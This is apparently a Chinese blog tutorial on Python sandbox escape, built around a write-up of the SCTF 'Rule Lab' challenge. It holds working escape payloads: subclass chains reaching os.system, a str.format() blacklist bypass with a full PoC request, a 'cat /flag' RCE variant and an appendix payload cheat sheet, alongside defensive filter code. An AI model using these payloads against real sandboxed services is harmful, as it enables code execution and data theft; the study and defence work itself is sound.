---
title: Python 沙箱逃逸全解：从入门到实战
date: 2026-06-23 22:00:00
tags:
- Python
- 沙箱逃逸
- CTF
- SCTF
- 代码审计
categories:
- 安全研究
---

> 涵盖 SCTF Rule Lab 等多种经典题型，系统化拆解 Python 沙箱逃逸的底层原理与绕过手法

---

## 目录

- [第1章 Python 沙箱逃逸概述](#第1章-python-沙箱逃逸概述)
- [第2章 Python 对象模型基础](#第2章-python-对象模型基础)
- [第3章 生成器与栈帧](#第3章-生成器与栈帧)
- [第4章 AST 黑名单沙箱](#第4章-ast-黑名单沙箱)
- [第5章 str.format() 逃逸](#第5章-strformat-逃逸)
- [第6章 其他逃逸手法](#第6章-其他逃逸手法)
- [第7章 实战：SCTF Rule Lab](#第7章-实战sctf-rule-lab)
- [第8章 防御与修复](#第8章-防御与修复)


## 第1章 Python 沙箱逃逸概述

### 1.1 什么是沙箱

沙箱（Sandbox）是一种安全机制，为不可信的代码提供一个隔离的执行环境。Python 沙箱通常用于：

- **在线判题系统**（OJ）：用户提交代码在服务端执行
- **CTF 题目**：选手需要从受限的代码执行环境中逃逸出来拿 Flag
- **插件系统**：第三方插件运行在隔离环境中
- **REPL 平台**：在线 Python 解释器

### 1.2 沙箱逃逸的本质

沙箱逃逸（Sandbox Escape）就是**从受限的执行环境突破到不受限的环境中**。在 Python 沙箱中通常意味着：

```
受限环境                          不受限环境
──────────────────   逃逸    ──────────────────
只能调某些函数      ────→    可以调任意函数
不能 import        ────→    可以 import os
不能读文件         ────→    可以 open("/flag")
不能执行命令       ────→    可以 os.system("id")
```

### 1.3 沙箱的三种类型

| 类型 | 原理 | 示例 |
|------|------|------|
| **受限命名空间** | 只提供白名单函数/模块 | `exec(code, {"__builtins__": {}})` |
| **AST 黑名单** | 编译前扫描语法树，拦截危险节点 | 遍历 AST 检查属性名 |
| **白名单字节码** | 只允许特定字节码指令 | RestrictedPython |

本文重点讲解 **AST 黑名单型** 沙箱及其绕过。

---

## 第2章 Python 对象模型基础

### 2.1 Python 一切皆对象

这是理解 Python 沙箱逃逸的**第一性原理**。

```python
# 类是对象
class Foo: pass      # Foo 本身也是对象

# 函数是对象
def bar(): pass      # bar 本身也是对象

# 类型是对象
type(42)             # int 也是对象
type(int)            # type 本身也是对象
```

### 2.2 属性的递归访问链

Python 的对象通过 `.` 运算符和 `[]` 下标运算符递归访问，这种递归性决定了逃逸路径的深度：

```python
obj.attr           # 对象属性
obj["key"]         # 下标访问
obj.attr["key"]    # 链式组合
obj.a.b.c.d       # 任意深度
```

### 2.3 魔术属性链：沙箱逃逸的"高速公路"

每个 Python 对象都有一系列以 `__` 开头的魔术属性，它们是沙箱逃逸的"高速公路"：

```python
"".__class__                 # <class 'str'>
"".__class__.__mro__         # 方法解析顺序 (Method Resolution Order)
"".__class__.__mro__[1]      # <class 'object'> — 所有类的基类
"".__class__.__mro__[1].__subclasses__()  # object 的所有子类
```

这条链被称为 **Python 沙箱逃逸的"万能钥匙"**：

```python
# 经典逃逸链
for cls in "".__class__.__mro__[1].__subclasses__():
    if cls.__name__ == "BuiltinImporter":
        cls.load_module("os").system("id")
```

### 2.4 `__builtins__`：内置函数的宝库

`__builtins__` 包含了所有 Python 内置函数：

```python
__builtins__["__import__"]   # import 语句的底层函数
__builtins__["open"]         # 文件打开函数
__builtins__["eval"]         # 表达式求值
__builtins__["exec"]         # 代码执行
__builtins__["__import__"]("os").system("id")
```

几乎所有沙箱逃逸的最终目标都是**拿到 `__builtins__`**。

---

## 第3章 生成器与栈帧

### 3.1 生成器基础

**普通函数**：调用后一口气执行完，返回，内部变量全部销毁。

```python
def hello():
    secret = "flag"
    print(secret)
```

**生成器函数**：带 `yield` 关键字，调用后返回生成器对象，每次执行到 `yield` 暂停。

```python
def hello():
    secret = "flag"
    yield 1   # ← 暂停键
    yield 2

g = hello()   # 只是创建对象，不执行函数体
next(g)       # 执行到第一个 yield，暂停
next(g)       # 继续执行到第二个 yield，暂停
next(g)       # StopIteration
```

### 3.2 yield 的暂停机制

**关键理解**：`yield` 暂停时，函数没有结束，所有局部变量仍然存在于内存中。

```python
def gen():
    secret = "只有我内部知道"
    yield 1

g = gen()
next(g)   # 执行到 yield，暂停
# secret 变量仍然存活在内存中，等待可能的 next(g) 继续执行
```

### 3.3 Frame（栈帧）

每次 Python 调用一个函数，底层会创建一个 **frame 对象**（栈帧），记录函数执行时的所有状态。

```
┌──────────────────────────────────────┐
│               Frame                   │
│                                       │
│  f_locals → 局部变量字典              │
│  f_globals → 全局变量字典             │
│  f_code       → 代码对象（字节码）    │
│  f_lineno     → 当前执行行号          │
│  f_back       → 上一层调用者的帧      │
└──────────────────────────────────────┘
```

普通函数返回后 frame 销毁。**生成器的 frame 在 yield 后不会销毁**。

### 3.4 `gi_frame` — 生成器的栈帧接口

`gi` = **G**enerator **I**terator。每个生成器对象通过 `gi_frame` 暴露其内部栈帧：

```python
def gen():
    secret = "CTF{flag}"
    yield 1

g = gen()
g.gi_frame       # None — 生成器还没启动

next(g)          # 启动生成器，执行到 yield
g.gi_frame       # <frame object at 0x...> — 有值了！
g.gi_frame.f_locals
# {'secret': 'CTF{flag}'}
```

### 3.5 从生成器到 frame 属性速查

```python
g.gi_frame                  # frame 对象
g.gi_frame.f_locals         # 局部变量字典     ← 读生成器内部变量
g.gi_frame.f_globals        # 全局变量字典     ← 含 __builtins__
g.gi_frame.f_back           # 调用者帧        ← 向上回溯
g.gi_frame.f_code           # 代码对象
g.gi_frame.f_lineno         # 当前行号
g.gi_frame.f_locals["shipment_manifest"]  # ← 读取指定局部变量
g.gi_frame.f_globals["__builtins__"]["open"]("/flag").read()  # ← RCE
```

### 3.6 为什么 gi_frame 会存在？

`gi_frame` 的本意是供调试器（pdb、traceback）使用的。但在沙箱中，它成了攻击者从外部窥探函数内部的窗口。

---

## 第4章 AST 黑名单沙箱

### 4.1 什么是 AST

AST（Abstract Syntax Tree，抽象语法树）是源代码的树形结构表示。

```python
import ast

code = "a + b * 3"
tree = ast.parse(code)
```

解析后的树：

```
Module
  └── Expr
      └── BinOp
          ├── Name('a')
          ├── Add()
          └── BinOp
              ├── Name('b')
              ├── Mult()
              └── Constant(3)
```

### 4.2 AST 黑名单沙箱的工作原理

三步流程：

```
用户输入代码字符串
     │
     ▼
Step 1: ast.parse(code)    → 把源码解析成 AST
Step 2: 遍历 AST 节点       → 检查黑名单中的属性名/字符串
Step 3: 通过后 exec(code)   → 执行
```

### 4.3 两种拦截方式

#### 方式一：拦截属性名（ast.Attribute）

```python
FORBIDDEN_ATTRS = {
    "gi_frame", "f_locals", "f_globals",
    "__class__", "__base__", "__subclasses__",
    "__builtins__", "__globals__", "__code__",
}

for node in ast.walk(tree):
    if isinstance(node, ast.Attribute):
        if node.attr in FORBIDDEN_ATTRS:
            raise SandboxError(f"forbidden attribute: {node.attr}")
```

拦截示例：

```python
g.gi_frame                    # ❌ ast.Attribute(attr="gi_frame")
g.gi_frame.f_locals           # ❌ 两次拦截
().__class__                  # ❌ ast.Attribute(attr="__class__")
```

#### 方式二：拦截字符串常量（ast.Constant）

```python
FORBIDDEN_STRINGS = {
    "gi_frame", "f_locals", "__builtins__",
}

for node in ast.walk(tree):
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        for s in FORBIDDEN_STRINGS:
            if s in node.value:
                raise SandboxError(f"forbidden string: {s}")
```

拦截示例：

```python
x = "gi_frame"                # ❌ ast.Constant("gi_frame")
x = "f_locals"                # ❌ ast.Constant("f_locals")
```

### 4.4 AST 检查的致命盲区

**AST 只看源码文本，不看运行时的值。**

```python
# ❌ 源码中出现 "gi_frame" → AST 检测到 → 拦截
x = "gi_frame"

# ✅ 源码中出现 "gi_" + "frame" → AST 看到两个单独字符串 → 放行
x = "gi_" + "frame"
# 运行时拼接后等于 "gi_frame"，此时 AST 已经检查完毕
```

这是所有绕过手法的**总纲**：编译期和运行期之间的时间差。

---

## 第5章 str.format() 逃逸

### 5.1 format() 你以为的功能

```python
"我的名字是{}，年龄{}".format("张三", 18)
# '我的名字是张三，年龄18'

"{0}和{1}和{0}".format("A", "B")
# 'A和B和A'
```

### 5.2 format() 实际上能做的

`str.format()` 的格式规范支持属性访问和下标访问：

```python
# 属性访问
"{0.attr}".format(obj)         → getattr(obj, "attr")

# 下标访问
"{0[key]}".format(obj)         → obj["key"]

# 链式组合（任意深度）
"{0.a.b[c].d[e]}".format(obj)  → obj.a.b["c"].d["e"]
```

格式字段解析规则：

```
"{0.a.b[c].d[e]}".format(obj)

format() 内部解析:
1. 取第 0 个参数       → obj
2. 遇到 .a             → getattr(obj, "a")
3. 遇到 .b             → getattr(obj.a, "b")
4. 遇到 [c]            → obj.a.b["c"]
5. 遇到 .d             → getattr(obj.a.b["c"], "d")
6. 遇到 [e]            → obj.a.b["c"].d["e"]
```

### 5.3 绕过原理

`format()` 的格式字符串是一个独立的字符串，可以从运行时拼接得到。AST 检查的是**源码中的字符串常量**，不是拼接结果。

```python
# AST 看到的三个字符串常量，每个都不含黑名单词
part1 = "{0.gi_"
part2 = "frame.f_"
part3 = "locals[shipment_manifest]}"

# 运行时拼接
field = part1 + part2 + part3
# field = "{0.gi_frame.f_locals[shipment_manifest]}"

# format() 在运行时执行属性链
result = field.format(g)
# 等价于: g.gi_frame.f_locals["shipment_manifest"]
```

### 5.4 对比：为什么直接写不行

```python
# ❌ 直接被 AST 拦截
g.gi_frame.f_locals["shipment_manifest"]

# ❌ 也会被拦截，字符串常量含黑名单词
field = "gi_frame.f_locals"
```

### 5.5 变种

#### 变种1：chr 函数绕过

```python
g = iter_preview_items()
next(g)
# g=chr(103), i=chr(105), _=chr(95)
field = chr(103) + chr(105) + "_frame.f_locals[shipment_manifest]}"
result = ("{0." + field).format(g)
```

#### 变种2：bytes 解码绕过

```python
g = iter_preview_items()
next(g)
field = "{0." + b"gi_frame.f_locals".decode() + "[shipment_manifest]}"
result = field.format(g)
```

#### 变种3：f-string 双层绕过

```python
g = iter_preview_items()
next(g)
a = "gi_"
b = "frame"
field = f"{{0.{a}{b}.f_locals[shipment_manifest]}}"
result = field.format(g)
```

### 5.6 与其他 bypass 的类比

```
SQL 注入:   ' O' || 'R' ' 1'='1      绕过 OR 关键词过滤
SSTI:       "cla"~"ss__"             绕过 __class__ 过滤
Python:     "{0.gi_" + "frame..."    绕过 gi_frame 过滤
```

**共同本质**：检测发生在编译/解析阶段，绕过手段把敏感字符串推迟到运行时才组装。

---

## 第6章 其他逃逸手法

### 6.1 getattr() 属性绕过

当属性名 `.gi_frame` 被拦截时，可以用 `getattr()` 函数：

```python
# AST 看到的是函数调用，不是属性访问节点
getattr(g, "gi_frame").f_locals
```

如果 `"gi_frame"` 字符串也被拦截：

```python
getattr(g, "gi_" + "frame").f_locals
```

### 6.2 `__builtins__` 经典逃逸链

在限制 `__builtins__` 的沙箱中，通过 **object → 子类 → 危险模块** 的链式逃逸：

```python
# Step 1: 拿到 object 类
().__class__.__bases__[0]
# 或
"".__class__.__mro__[1]
# 或
{}.__class__.__bases__[0]

# Step 2: 列出 object 的所有子类
().__class__.__bases__[0].__subclasses__()

# Step 3: 寻找有用的子类（常用目标）
# - <class 'os.wrap_close'> → os 模块
# - <class 'warnings.catch_warnings'> → 内置模块访问
# - <class '_frozen_importlib.BuiltinImporter'> → import 能力
# - <class 'subprocess.Popen'> → 命令执行

# 完整利用（找 BuiltinImporter）
for cls in ().__class__.__bases__[0].__subclasses__():
    if cls.__name__ == "BuiltinImporter":
        cls.load_module("os").system("id")
```

### 6.3 函数对象的 `__globals__`

每个 Python 函数（包括 lambda）都有一个 `__globals__` 属性，指向定义该函数时的全局命名空间：

```python
def f():
    pass

f.__globals__         # 包含模块的全局变量
f.__globals__["__builtins__"]  # ← 拿到内置函数
f.__globals__["__builtins__"]["__import__"]("os").system("id")
```

如果函数名被拦截：

```python
(lambda: 0).__globals__["__builtins__"]
# lambda 也是函数，同样有 __globals__
```

### 6.4 异常回溯（traceback）

```python
try:
    1/0
except Exception as e:
    e.__traceback__.tb_frame.f_globals["__builtins__"]
    # 通过异常对象的回溯帧访问全局作用域
```

### 6.5 sys.modules 缓存

```python
import sys
sys.modules["os"]   # 如果 os 之前被导入过，直接取缓存
```

### 6.6 绕过手法对照表

| 手法 | 绕过对象 | 核心机制 |
|------|---------|---------|
| `str.format()` | AST 属性名黑名单 | format 字段解析在运行期 |
| `getattr()` | AST 属性名黑名单 | 函数调用而非属性节点 |
| 字符串拼接 | 字符串常量黑名单 | 运行时拼接绕过编译期 |
| `__subclasses__()` | 没有 `builtins` | 通过基类找到子类 |
| `__globals__` | 没有 `builtins` | 函数对象的全局命名空间 |
| `chr()` / `bytes()` | 字符串常量黑名单 | 运行时生成字符串 |
| `eval()` 嵌套 | 多重限制 | 二次执行绕过检查 |

---

## 第7章 实战：SCTF Rule Lab

### 7.1 题目信息

| 项目 | 内容 |
|------|------|
| **题目名称** | Rule Lab |
| **比赛** | SCTF |
| **沙箱类型** | AST 黑名单过滤型 |
| **核心漏洞** | `str.format()` 绕过 AST 属性检查 |
| **目标** | 读取生成器 frame 中的 `shipment_manifest` |

### 7.2 沙箱设定

服务端暴露了一个业务函数：

```python
def iter_preview_items():
    shipment_manifest = load_manifest()  # ← flag 内容加载到局部变量
    for item in preview_items:
        yield item                        # ← yield，shipment_manifest 残留在 frame
```

沙箱核心逻辑：

```python
code = user_input  # 用户提交的代码
tree = ast.parse(code)
for node in ast.walk(tree):
    # 拦截危险属性名
    if isinstance(node, ast.Attribute):
        if node.attr in FORBIDDEN_ATTRS:
            raise SandboxError(f"forbidden attribute: {node.attr}")
    # 拦截敏感字符串常量
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        for s in FORBIDDEN_STRINGS:
            if s in node.value:
                raise SandboxError(f"forbidden string: {s}")
exec(code)  # 通过后执行
```

黑名单包含 `gi_frame`、`f_locals`、`f_globals` 等。

### 7.3 逐层分析

**目标**：读取 `iter_preview_items()` 生成器内部 frame 中的 `shipment_manifest` 变量。

**正常读取代码**：

```python
g = iter_preview_items()
next(g)
g.gi_frame.f_locals["shipment_manifest"]   # ❌ gi_frame 被拦截
```

**字符串版**：

```python
g = iter_preview_items()
next(g)
result = g.gi_frame.f_locals["shipment_manifest"]
# ❌ 属性名 gi_frame、f_locals 被拦截
```

**用 getattr 绕过属性名**：

```python
g = iter_preview_items()
next(g)
getattr(getattr(g, "gi_frame"), "f_locals")["shipment_manifest"]
# ❌ "gi_frame" 字符串被字符串常量检查拦截
```

**用 getattr + 字符串拼接**：

```python
g = iter_preview_items()
next(g)
getattr(getattr(g, "gi_" + "frame"), "f_locals")["shipment_manifest"]
# ❌ getattr 中嵌套的 .f_locals 仍然会被 ast.Attribute 拦截
```

**用 format 一次绕过**：

```python
g = iter_preview_items()
next(g)

# AST 看到的:
part1 = "{0.gi_"      # ← 不包含黑名单词
part2 = "frame.f_"    # ← 不包含黑名单词  
part3 = "locals[shipment_manifest]}"  # ← 不包含黑名单词

# 运行时:
field = part1 + part2 + part3
# field = "{0.gi_frame.f_locals[shipment_manifest]}"
result = field.format(g)
# 等价于: g.gi_frame.f_locals["shipment_manifest"]
```

### 7.4 完整 PoC

```python
g = iter_preview_items()
next(g)
field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
result = field.format(g)
```

提交请求：

```
POST /api/rules/run
Authorization: Bearer <token>
Content-Type: application/json

{
  "code": "g = iter_preview_items()\nnext(g)\nfield = \"{0.gi_\" + \"frame.f_\" + \"locals[shipment_manifest]}\"\nresult = field.format(g)"
}
```

成功响应：

```json
{
  "ok": true,
  "result": "SCTF{...}",
  "elapsedMs": 0
}
```

### 7.5 知识链复盘

```
题目给了: iter_preview_items() 生成器函数
        │
        ▼
[知识点1] 生成器 yield 暂停，frame 不销毁
   → 变量 shipment_manifest 仍存在于内存中
        │
        ▼
[知识点2] 生成器对象有 gi_frame 属性
   → g.gi_frame 可以拿到生成器的栈帧
        │
        ▼
[知识点3] frame 对象有 f_locals 属性
   → f_locals["shipment_manifest"] 可读取 flag
        │
        ▼
[知识点4] AST 黑名单
   → 拦截 gi_frame、f_locals 出现在源码中
        │
        ▼
[知识点5] str.format() 能做属性/下标访问
   → "{0.gi_frame.f_locals[key]}".format(g)
   → 等价于 g.gi_frame.f_locals["key"]
        │
        ▼
[知识点6] 字符串拼接绕过 AST
   → "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
   → AST 看到三个无害字符串自行拼接
```

### 7.6 其他绕过路径（拓展思路）

```python
# 用 chr() 构造字符串
g = iter_preview_items()
next(g)
field = "{0." + chr(103) + chr(105) + "_frame.f_locals[shipment_manifest]}"
result = field.format(g)

# 用 bytes.decode()
g = iter_preview_items()
next(g)
field = "{0." + bytes([103, 105, 95, 102, 114, 97, 109, 101]).decode() + ".f_locals[shipment_manifest]}"
result = field.format(g)

# 读取 f_globals 实现 RCE
g = iter_preview_items()
next(g)
field = "{0.gi_" + "frame.f_" + "globals[__builtins__]}"
builtins = field.format(g)
builtins["__import__"]("os").system("cat /flag > /tmp/out")
```

---

## 第8章 防御与修复

### 8.1 对出题者的修复建议

| # | 建议 | 说明 |
|---|------|------|
| 1 | **白名单而非黑名单** | 只允许安全属性，而非拦截已知危险属性 |
| 2 | **yield 后清理敏感变量** | `del shipment_manifest` 避免 frame 残留 |
| 3 | **禁用 str.format()** | 或限制格式字符串来源 |
| 4 | **覆盖生成器的 __format__** | 阻止 format() 访问内部 frame |
| 5 | **使用 RestrictedPython** | 成熟的白名单方案 |
| 6 | **禁用 __builtins__** | `exec(code, {"__builtins__": {}})` |

### 8.2 针对 format 逃逸的防御

```python
# 遍历 AST 拦截所有 Call 节点中调用 format 的
for node in ast.walk(tree):
    if isinstance(node, ast.Call):
        if isinstance(node.func, ast.Attribute) and node.func.attr == "format":
            raise SandboxError("format is not allowed")
```

但攻击者可以继续绕过：

```python
# 用 getattr 间接调用 format
getattr("{0.gi_frame.f_locals[key]}", "format")(g)
```

### 8.3 终极方案：白名单策略

```python
SAFE_ATTRS = {
    # 只允许基础类型的安全属性
    "real", "imag", "numerator", "denominator",
    "start", "stop", "step",
    "upper", "lower", "strip", "replace", "split",
    "join", "count", "index", "find",
    "keys", "values", "items", "get",
}

for node in ast.walk(tree):
    if isinstance(node, ast.Attribute):
        if node.attr not in SAFE_ATTRS:
            raise SandboxError(f"unsafe attribute: {node.attr}")
```

黑名单总有遗漏，白名单才能彻底封堵。

### 8.4 关键教训

> **沙箱逃逸的本质不是"Python 有漏洞"，而是"攻击者利用了 Python 强大而灵活的对象模型和反射能力，从本不应暴露的角度访问了内部机制"。**

防御沙箱逃逸没有银弹。白名单 + 最小权限 + 深度防御 是唯一可靠的组合方案。

---

## 附录

### A. 常用 Payload 速查

```python
# 1. 经典 __subclasses__ 链
for cls in ().__class__.__bases__[0].__subclasses__():
    if cls.__name__ == "wrap_close":
        cls.__init__.__globals__["system"]("id")

# 2. 通过 BuiltinImporter 加载 os
for cls in ().__class__.__mro__[1].__subclasses__():
    if cls.__name__ == "BuiltinImporter":
        cls.load_module("os").system("id")

# 3. 异常回溯逃逸
try: 1/0
except: import sys; sys.exc_info()[2].tb_frame.f_globals

# 4. lambda 的 __globals__
(lambda: 0).__globals__["__builtins__"]

# 5. 生成器 frame 逃逸
g = (x for x in [1])
next(g)
g.gi_frame.f_globals["__builtins__"]

# 6. format 绕过 AST 黑名单
g = iter_preview_items()
next(g)
field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
result = field.format(g)
```

### B. 逃逸手法思维导图

```
Python 沙箱逃逸
│
├── 对象模型链
│   ├── __class__ → __mro__ → __subclasses__()
│   ├── __builtins__
│   └── __globals__
│
├── 生成器 & 帧
│   ├── gi_frame → f_locals / f_globals
│   ├── f_back → 向上回溯
│   └── tb_frame (异常回溯)
│
├── 绕过技术
│   ├── str.format() ← 本文重点
│   ├── getattr() 替代 . 运算
│   ├── 字符串拼接 chr/bytes
│   ├── 嵌套 eval()
│   └── import 技巧
│
└── 沙箱类型
    ├── AST 黑名单 → format / 拼接绕过
    ├── 命名空间限制 → __subclasses__ 链
    ├── exec 限制 → eval / compile
    └── 白名单 → 寻找遗漏的白名单类
```
